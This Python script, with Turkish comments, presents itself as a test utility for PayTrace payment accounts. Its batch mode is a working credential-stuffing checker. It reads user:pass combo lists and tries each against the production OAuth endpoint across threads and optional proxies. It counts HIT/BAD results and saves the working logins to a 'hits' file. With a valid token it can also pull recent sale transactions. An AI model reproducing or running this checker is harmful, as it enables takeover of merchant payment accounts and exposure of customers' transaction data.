#!/usr/bin/env python3
"""
PayTrace Hesap Test Uygulaması
Tüm PayTrace API hesaplarını ve bağlantılarını test eder.

Kullanım:
    python3 paytrace_test_app.py                        # İnteraktif menü
    python3 paytrace_test_app.py --quick                # Hızlı bağlantı testi
    python3 paytrace_test_app.py -u USER -p PASS        # Tek hesap testi
    python3 paytrace_test_app.py -f accounts.txt        # Toplu hesap testi
    python3 paytrace_test_app.py -u USER -p PASS -i ID  # Tam API testi (refund dahil)
"""

import argparse
import json
import os
import sys
import time
import threading
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROD_BASE = "https://api.paytrace.com"
SANDBOX_BASE = "https://api.sandbox.paytrace.com"

VERSION = "1.0.0"

C_GREEN = "\033[92m"
C_RED = "\033[91m"
C_YELLOW = "\033[93m"
C_CYAN = "\033[96m"
C_BOLD = "\033[1m"
C_DIM = "\033[90m"
C_RESET = "\033[0m"

lock = threading.Lock()


def color(text, c):
    return f"{c}{text}{C_RESET}"


def banner():
    print()
    print(f"  {C_CYAN}╔══════════════════════════════════════════════════╗{C_RESET}")
    print(f"  {C_CYAN}║   PayTrace Hesap Test Uygulaması  v{VERSION}        ║{C_RESET}")
    print(f"  {C_CYAN}╚══════════════════════════════════════════════════╝{C_RESET}")
    print(f"  {C_DIM}Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{C_RESET}")
    print()


def separator(char="─", width=52):
    print(f"  {char * width}")


def test_connectivity(base_url, timeout=10, proxy=None):
    """API sunucusuna TCP/HTTP bağlantı testi."""
    proxies = {"https": proxy, "http": proxy} if proxy else None
    try:
        start = time.time()
        resp = requests.get(base_url, timeout=timeout, proxies=proxies,
                            verify=True, allow_redirects=True)
        elapsed = (time.time() - start) * 1000
        return {
            "ok": True,
            "http_code": resp.status_code,
            "latency_ms": round(elapsed, 1),
        }
    except requests.exceptions.SSLError:
        return {"ok": False, "error": "SSL sertifika hatası"}
    except requests.exceptions.ProxyError:
        return {"ok": False, "error": "Proxy bağlantı hatası"}
    except requests.exceptions.ConnectionError as e:
        err = str(e)
        if "NameResolutionError" in err or "getaddrinfo" in err:
            return {"ok": False, "error": "DNS çözümlenemedi"}
        if "Connection refused" in err:
            return {"ok": False, "error": "Bağlantı reddedildi"}
        return {"ok": False, "error": f"Bağlantı hatası: {err[:100]}"}
    except requests.exceptions.Timeout:
        return {"ok": False, "error": "Zaman aşımı"}
    except Exception as e:
        return {"ok": False, "error": str(e)[:100]}


def test_oauth(username, password, base_url, timeout=30, proxy=None):
    """OAuth 2.0 password grant ile kimlik doğrulama testi."""
    url = f"{base_url}/oauth/token"
    proxies = {"https": proxy, "http": proxy} if proxy else None
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
    }
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
    }

    try:
        start = time.time()
        resp = requests.post(url, headers=headers, data=data,
                             timeout=timeout, proxies=proxies, verify=True)
        elapsed = (time.time() - start) * 1000

        try:
            body = resp.json()
        except Exception:
            return {
                "ok": False,
                "http_code": resp.status_code,
                "error": f"Yanıt JSON değil: {resp.text[:150]}",
                "latency_ms": round(elapsed, 1),
            }

        if resp.status_code == 200 and "access_token" in body:
            return {
                "ok": True,
                "http_code": 200,
                "access_token": body["access_token"],
                "token_type": body.get("token_type", "Bearer"),
                "expires_in": body.get("expires_in"),
                "latency_ms": round(elapsed, 1),
            }

        error_msg = body.get("error_description",
                             body.get("error",
                                      body.get("message", str(body))))
        return {
            "ok": False,
            "http_code": resp.status_code,
            "error": error_msg,
            "latency_ms": round(elapsed, 1),
        }
    except requests.exceptions.Timeout:
        return {"ok": False, "error": "Zaman aşımı", "http_code": None}
    except requests.exceptions.ConnectionError as e:
        return {"ok": False, "error": f"Bağlantı hatası: {str(e)[:100]}", "http_code": None}
    except Exception as e:
        return {"ok": False, "error": str(e)[:100], "http_code": None}


def test_api_endpoints(access_token, base_url, integrator_id, timeout=30):
    """Authenticated API endpoint'lerini test et."""
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {access_token}",
    }
    results = []

    end_date = datetime.now().strftime("%m/%d/%Y")
    start_date = (datetime.now() - timedelta(days=7)).strftime("%m/%d/%Y")

    endpoints = [
        {
            "name": "Satış Listesi (Son 7 Gün)",
            "url": f"{base_url}/v1/transactions/export/by_date_range",
            "payload": {
                "start_date": start_date,
                "end_date": end_date,
                "transaction_type": "SALE",
                "integrator_id": integrator_id,
            },
        },
    ]

    for ep in endpoints:
        try:
            start = time.time()
            resp = requests.post(ep["url"], headers=headers,
                                 json=ep["payload"], timeout=timeout)
            elapsed = (time.time() - start) * 1000
            body = resp.json()

            ok = body.get("success", False)
            tx_count = len(body.get("transactions", []))
            results.append({
                "name": ep["name"],
                "ok": ok,
                "http_code": resp.status_code,
                "latency_ms": round(elapsed, 1),
                "detail": f"{tx_count} işlem bulundu" if ok else body.get("status_message", "Başarısız"),
            })
        except Exception as e:
            results.append({
                "name": ep["name"],
                "ok": False,
                "error": str(e)[:100],
            })

    return results


def parse_accounts_file(filepath):
    """Hesap dosyasını oku. Formatlar: user pass / user:pass / user|pass"""
    accounts = []
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        for line_num, line in enumerate(f, 1):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            for sep in [":", "|", " ", "\t"]:
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2 and parts[0].strip() and parts[1].strip():
                        accounts.append((parts[0].strip(), parts[1].strip()))
                        break
    return accounts


def run_connectivity_tests(proxy=None):
    """Production ve Sandbox bağlantı testleri."""
    print(f"\n  {C_BOLD}[1/4] BAĞLANTI TESTLERİ{C_RESET}")
    separator()

    for env_name, base_url in [("PRODUCTION", PROD_BASE), ("SANDBOX", SANDBOX_BASE)]:
        result = test_connectivity(base_url, proxy=proxy)
        if result["ok"]:
            print(f"  {color('✓', C_GREEN)} {env_name:<12} "
                  f"HTTP {result['http_code']}  "
                  f"{C_DIM}{result['latency_ms']}ms{C_RESET}")
        else:
            print(f"  {color('✗', C_RED)} {env_name:<12} "
                  f"{color(result['error'], C_RED)}")

    separator()


def run_single_auth_test(username, password, sandbox=False, proxy=None):
    """Tek hesap için kimlik doğrulama testi."""
    base_url = SANDBOX_BASE if sandbox else PROD_BASE
    env_name = "SANDBOX" if sandbox else "PRODUCTION"

    print(f"\n  {C_BOLD}[2/4] KİMLİK DOĞRULAMA TESTİ ({env_name}){C_RESET}")
    separator()
    print(f"  Kullanıcı: {username}")
    print(f"  Ortam    : {env_name}")
    print(f"  Deneniyor...", end=" ", flush=True)

    result = test_oauth(username, password, base_url, proxy=proxy)

    if result["ok"]:
        token_preview = result["access_token"][:20] + "..."
        print(f"\r  {color('✓ GİRİŞ BAŞARILI', C_GREEN)}")
        separator("─", 52)
        print(f"  Token    : {C_DIM}{token_preview}{C_RESET}")
        print(f"  Tür      : {result['token_type']}")
        print(f"  Süre     : {result['expires_in']}s")
        print(f"  Gecikme  : {result['latency_ms']}ms")
    else:
        http_info = f" (HTTP {result['http_code']})" if result.get('http_code') else ""
        print(f"\r  {color('✗ GİRİŞ BAŞARISIZ', C_RED)}{http_info}")
        print(f"  Hata     : {result['error']}")

    separator()
    return result


def run_api_tests(access_token, base_url, integrator_id):
    """API endpoint testleri."""
    print(f"\n  {C_BOLD}[3/4] API ENDPOINT TESTLERİ{C_RESET}")
    separator()

    results = test_api_endpoints(access_token, base_url, integrator_id)
    for r in results:
        if r["ok"]:
            print(f"  {color('✓', C_GREEN)} {r['name']}")
            print(f"    {C_DIM}HTTP {r['http_code']} | {r['latency_ms']}ms | {r['detail']}{C_RESET}")
        else:
            print(f"  {color('✗', C_RED)} {r['name']}")
            err = r.get("error", r.get("detail", "Bilinmeyen hata"))
            print(f"    {color(err, C_RED)}")

    separator()
    return results


def run_batch_test(accounts, sandbox=False, threads=3, proxy=None):
    """Toplu hesap testi."""
    base_url = SANDBOX_BASE if sandbox else PROD_BASE
    env_name = "SANDBOX" if sandbox else "PRODUCTION"
    total = len(accounts)

    print(f"\n  {C_BOLD}TOPLU HESAP TESTİ ({env_name}){C_RESET}")
    separator()
    print(f"  Hesap    : {total}")
    print(f"  Thread   : {threads}")
    separator()

    stats = {"hit": 0, "bad": 0, "error": 0, "done": 0}
    hits = []

    def check_account(user, passwd):
        result = test_oauth(user, passwd, base_url, proxy=proxy)
        with lock:
            stats["done"] += 1
            if result["ok"]:
                stats["hit"] += 1
                hits.append((user, passwd, result))
                token_preview = result["access_token"][:16] + "..."
                print(f"\r  {color('[HIT]', C_GREEN)} {user}  "
                      f"token={C_DIM}{token_preview}{C_RESET}")
            elif result.get("http_code") == 401 or "invalid" in str(result.get("error", "")).lower():
                stats["bad"] += 1
            else:
                stats["error"] += 1

            done = stats["done"]
            pct = done / total * 100
            bar_len = 30
            filled = int(bar_len * done / total)
            bar = "█" * filled + "░" * (bar_len - filled)
            hit_str = color(f'Hit:{stats["hit"]}', C_GREEN)
            bad_str = color(f'Bad:{stats["bad"]}', C_RED)
            err_str = color(f'Err:{stats["error"]}', C_YELLOW)
            sys.stdout.write(
                f"\r  [{bar}] {pct:5.1f}%  "
                f"{hit_str}  {bad_str}  {err_str}  "
            )
            sys.stdout.flush()

        return result

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {pool.submit(check_account, u, p): (u, p) for u, p in accounts}
        for f in as_completed(futures):
            f.result()

    print("\n")
    separator()
    print(f"  {C_BOLD}SONUÇLAR{C_RESET}")
    print(f"  Toplam   : {total}")
    print(f"  {color('Hit      : ' + str(stats['hit']), C_GREEN)}")
    print(f"  {color('Bad      : ' + str(stats['bad']), C_RED)}")
    print(f"  {color('Error    : ' + str(stats['error']), C_YELLOW)}")

    if hits:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        hits_file = f"paytrace_hits_{ts}.txt"
        with open(hits_file, "w") as f:
            for user, passwd, _ in hits:
                f.write(f"{user}:{passwd}\n")
        print(f"\n  {color(f'Başarılı hesaplar -> {hits_file}', C_GREEN)}")

    separator()
    return stats


def run_summary(conn_ok, auth_result, api_results=None):
    """Test özeti."""
    print(f"\n  {C_BOLD}[4/4] GENEL ÖZET{C_RESET}")
    separator("═", 52)

    checks = [
        ("Sunucu Bağlantısı", conn_ok),
        ("Kimlik Doğrulama", auth_result.get("ok", False) if auth_result else None),
    ]
    if api_results:
        api_ok = all(r["ok"] for r in api_results)
        checks.append(("API Endpoint'leri", api_ok))

    all_ok = True
    for name, status in checks:
        if status is True:
            print(f"  {color('✓', C_GREEN)} {name}")
        elif status is False:
            print(f"  {color('✗', C_RED)} {name}")
            all_ok = False
        else:
            print(f"  {color('–', C_YELLOW)} {name} (atlandı)")

    separator("═", 52)

    if all_ok:
        print(f"\n  {color('★ TÜM TESTLER BAŞARILI - Hesabınız çalışıyor!', C_GREEN)}")
    else:
        print(f"\n  {color('⚠ Bazı testler başarısız oldu.', C_RED)}")
        print(f"  {C_DIM}Öneriler:{C_RESET}")
        if not conn_ok:
            print(f"    • İnternet bağlantınızı kontrol edin")
            print(f"    • VPN veya proxy deneyin")
        if auth_result and not auth_result.get("ok"):
            print(f"    • Kullanıcı adı ve şifrenizi kontrol edin")
            print(f"    • --sandbox ile sandbox ortamını deneyin")
    print()


def interactive_menu():
    """İnteraktif menü."""
    while True:
        print(f"\n  {C_BOLD}MENÜ{C_RESET}")
        separator()
        print(f"  {C_CYAN}1{C_RESET} - Bağlantı Testi (Production + Sandbox)")
        print(f"  {C_CYAN}2{C_RESET} - Tek Hesap Testi")
        print(f"  {C_CYAN}3{C_RESET} - Dosyadan Toplu Hesap Testi")
        print(f"  {C_CYAN}4{C_RESET} - Tam API Testi (Hesap + Endpoint'ler)")
        print(f"  {C_CYAN}5{C_RESET} - Hızlı Durum Kontrolü")
        print(f"  {C_CYAN}q{C_RESET} - Çıkış")
        separator()

        choice = input(f"  Seçiminiz: ").strip().lower()
        print()

        if choice == "1":
            run_connectivity_tests()

        elif choice == "2":
            username = input("  Kullanıcı adı: ").strip()
            password = input("  Şifre: ").strip()
            if not username or not password:
                print(f"  {color('Kullanıcı adı ve şifre gerekli!', C_RED)}")
                continue
            sandbox_input = input("  Sandbox kullan? (e/h) [h]: ").strip().lower()
            sandbox = sandbox_input == "e"

            run_connectivity_tests()
            run_single_auth_test(username, password, sandbox=sandbox)

        elif choice == "3":
            filepath = input("  Hesap dosyası yolu: ").strip()
            if not os.path.isfile(filepath):
                print(f"  {color(f'Dosya bulunamadı: {filepath}', C_RED)}")
                continue
            accounts = parse_accounts_file(filepath)
            if not accounts:
                print(f"  {color('Dosyada geçerli hesap bulunamadı!', C_RED)}")
                print(f"  {C_DIM}Format: user:pass veya user pass (her satırda){C_RESET}")
                continue

            sandbox_input = input(f"  Sandbox kullan? (e/h) [h]: ").strip().lower()
            sandbox = sandbox_input == "e"
            threads_input = input(f"  Thread sayısı [3]: ").strip()
            threads = int(threads_input) if threads_input.isdigit() else 3

            run_batch_test(accounts, sandbox=sandbox, threads=threads)

        elif choice == "4":
            username = input("  Kullanıcı adı: ").strip()
            password = input("  Şifre: ").strip()
            integrator_id = input("  Integrator ID: ").strip()
            if not all([username, password, integrator_id]):
                print(f"  {color('Tüm alanlar gerekli!', C_RED)}")
                continue

            sandbox_input = input("  Sandbox kullan? (e/h) [h]: ").strip().lower()
            sandbox = sandbox_input == "e"
            base_url = SANDBOX_BASE if sandbox else PROD_BASE

            run_connectivity_tests()
            auth = run_single_auth_test(username, password, sandbox=sandbox)

            api_results = None
            if auth["ok"]:
                api_results = run_api_tests(auth["access_token"], base_url, integrator_id)

            conn = test_connectivity(base_url)
            run_summary(conn["ok"], auth, api_results)

        elif choice == "5":
            print(f"  {C_BOLD}HIZLI DURUM KONTROLÜ{C_RESET}")
            separator()
            for name, url in [("Production", PROD_BASE), ("Sandbox", SANDBOX_BASE)]:
                r = test_connectivity(url)
                status = color("ÇALIŞIYOR", C_GREEN) if r["ok"] else color("ULAŞILAMIYOR", C_RED)
                latency = f" ({r['latency_ms']}ms)" if r.get("latency_ms") else ""
                print(f"  {name:<12}: {status}{C_DIM}{latency}{C_RESET}")
            separator()

        elif choice == "q":
            print(f"  {C_DIM}Çıkış yapılıyor...{C_RESET}\n")
            break

        else:
            print(f"  {color('Geçersiz seçim!', C_RED)}")


def main():
    parser = argparse.ArgumentParser(
        description="PayTrace Hesap Test Uygulaması",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Örnekler:
  python3 paytrace_test_app.py                          # İnteraktif menü
  python3 paytrace_test_app.py --quick                  # Hızlı bağlantı testi
  python3 paytrace_test_app.py -u USER -p PASS          # Tek hesap testi
  python3 paytrace_test_app.py -u USER -p PASS --sandbox  # Sandbox testi
  python3 paytrace_test_app.py -f accounts.txt          # Toplu test
  python3 paytrace_test_app.py -f accounts.txt -t 5     # 5 thread ile toplu test
  python3 paytrace_test_app.py -u USER -p PASS -i ID    # Tam API testi

Hesap dosyası formatı (her satırda):
  user:pass
  user pass
  user|pass
        """,
    )

    parser.add_argument("-u", "--username", help="PayTrace kullanıcı adı")
    parser.add_argument("-p", "--password", help="PayTrace şifresi")
    parser.add_argument("-i", "--integrator-id", help="PayTrace Integrator ID (API endpoint testi için)")
    parser.add_argument("-f", "--file", help="Hesap dosyası (toplu test)")
    parser.add_argument("-t", "--threads", type=int, default=3, help="Thread sayısı (varsayılan: 3)")
    parser.add_argument("--sandbox", action="store_true", help="Sandbox ortamını kullan")
    parser.add_argument("--quick", action="store_true", help="Sadece bağlantı testi")
    parser.add_argument("--proxy", help="Proxy adresi (ör: socks5://127.0.0.1:1080)")
    parser.add_argument("--json", action="store_true", help="Sonuçları JSON formatında göster")
    parser.add_argument("--timeout", type=int, default=30, help="İstek zaman aşımı (saniye)")

    args = parser.parse_args()
    banner()

    if args.quick:
        run_connectivity_tests(proxy=args.proxy)
        return

    if args.file:
        if not os.path.isfile(args.file):
            print(f"  {color(f'Dosya bulunamadı: {args.file}', C_RED)}")
            sys.exit(1)
        accounts = parse_accounts_file(args.file)
        if not accounts:
            print(f"  {color('Dosyada geçerli hesap bulunamadı!', C_RED)}")
            sys.exit(1)

        run_connectivity_tests(proxy=args.proxy)
        stats = run_batch_test(accounts, sandbox=args.sandbox,
                               threads=args.threads, proxy=args.proxy)

        if args.json:
            print(json.dumps(stats, indent=2, ensure_ascii=False))
        return

    if args.username:
        if not args.password:
            print(f"  {color('-p (şifre) gerekli!', C_RED)}")
            sys.exit(1)

        base_url = SANDBOX_BASE if args.sandbox else PROD_BASE
        run_connectivity_tests(proxy=args.proxy)

        conn = test_connectivity(base_url, proxy=args.proxy)
        if not conn["ok"]:
            print(f"  {color('Sunucuya bağlanılamıyor! Test durduruluyor.', C_RED)}")
            sys.exit(1)

        auth = run_single_auth_test(args.username, args.password,
                                    sandbox=args.sandbox, proxy=args.proxy)

        api_results = None
        if auth["ok"] and args.integrator_id:
            api_results = run_api_tests(auth["access_token"], base_url, args.integrator_id)

        run_summary(conn["ok"], auth, api_results)

        if args.json:
            output = {
                "connectivity": conn,
                "auth": {k: v for k, v in auth.items() if k != "access_token"},
            }
            if api_results:
                output["api_endpoints"] = api_results
            print(json.dumps(output, indent=2, ensure_ascii=False))
        return

    interactive_menu()


if __name__ == "__main__":
    main()
